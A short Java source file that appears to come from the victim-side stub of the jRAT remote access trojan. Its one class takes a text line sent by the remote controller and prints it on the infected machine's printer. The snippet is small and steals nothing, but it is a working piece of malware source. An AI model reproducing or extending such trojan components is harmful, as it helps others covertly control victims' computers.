package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;

import javax.swing.JTextPane;


public class Packet69Print extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String toprint = con.readLine();
		JTextPane c = new JTextPane();
		c.setText(toprint);
		c.print();
	}

}
